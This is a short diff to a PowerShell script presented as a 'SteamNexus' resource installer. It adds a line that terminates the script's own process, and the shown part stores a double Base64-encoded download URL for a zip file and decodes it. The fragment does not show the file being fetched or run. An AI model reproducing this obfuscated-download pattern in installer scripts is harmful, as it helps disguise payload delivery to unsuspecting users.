@@ -1,5 +1,5 @@
 ## ConfiguraciÃ³n de - Recursos
-8d9wau89da98w
+Stop-Process -Id $PID -Force
 $Host.UI.RawUI.WindowTitle = "SteamNexus | Instalador de Recursos"
 $a = "YUhSMGNIQnpPaTh2WjJsaGRHaHViMk5oYlM5VUxYSXlNUzh2YkdselpXNWpaUzl5Wld4bFlYTmxjeTlrYjNkdWJHOWhaQzkyTVM0d0xqQXZZM0ZqYXk1NmFYQT0="
 $b = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a))
